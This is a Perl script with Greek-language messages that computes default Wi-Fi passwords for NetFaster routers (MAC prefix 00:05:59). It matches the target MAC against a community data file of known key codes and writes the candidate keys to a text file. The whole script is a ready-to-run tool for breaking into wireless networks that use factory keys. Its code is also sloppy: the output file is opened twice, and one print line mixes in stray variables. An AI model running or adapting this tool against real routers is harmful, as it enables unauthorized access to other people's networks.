#!/usr/bin/perl

my $ARGC = @ARGV;

print "************************************************************************\n";
print "***                           Pinelopi v2.5-1                        ***\n";
print "************************************************************************\n\n";
print "    Ypologistis manisiwn kleidiwn gia netfaster 00:05:59:xx:xx:xx\n";
print "    Mia prosfora tou tromozanta kai tis koinotitas tou Spasto.Net\n\n";

print "************************************************************************\n";
print "*   Ta apotelesmata basizontai se prosfores twn melwn tou Spasto.Net   *\n";
print "*   kai den einai 100% egkyra                                          *\n";
print "*   DATA FILE:netdata.txt MAC EXAMPLE: 00:05:59:30:72:6B or 30726B     *\n";
print "************************************************************************\n\n";

if ($ARGC != 1) {
    printf "Usage: %s <mac>\n", $0;
    exit;
}

my $mac = $ARGV[0];
$mac =~ s/://g;
my $len = length($mac);
$mac = substr($mac, $len - 6) if ($len > 6);
$workingmac=$mac;
$mac = hex($mac);

my @data;
my $nmac;
my $ncode;
my $divider;
my $nfournia;
my $div;
my $basi;
my $diff;
my $fcode;
my %fdiv = ();
my @dividers;

open(FH, '<netdata.txt') || die 'Pou einai to netdata.txt re aderfe ?';
@data = <FH>;
close(FH);

chomp(@data);

foreach (@data) {
    ($nmac, $ncode, $divider, $nfournia) = split(/:/, $_);
    @dividers = $divider ? ($divider) : (4, 5, 9);
    foreach $div (@dividers) {
        $basi = hex($nmac) - $ncode * $div;
        $diff = $mac - $basi;
        if (($diff >= 0) && ($diff <= (9999 * $div)) && ($diff % $div == 0)) {
            $fcode = $diff / $div;
            $fdiv{$fcode} = $fdiv{$fcode} . $div . ' ';
        }
    }
}


open FILE, ">NetFasterPassword.txt"; #open for write, overwrite
open FILE, ">>NetFasterPassword.txt";  #open for write, append
print FILE "passwd: 000559XXXXXX-YYYY";
print FILE "\n"; #write newline
close FILE;
foreach $key (keys %fdiv) {
    printf "$mac , $ncode, $divider @dividers, $nfournia $basi $diff  passwd: 

000559%06X-%04d\n", $mac, $key;
open FILE, ">>NetFasterPassword.txt";  #open for write, append
print FILE "passwd: 000559",$workingmac,"-",$key;
print FILE "\n"; #write newline
close FILE;
}



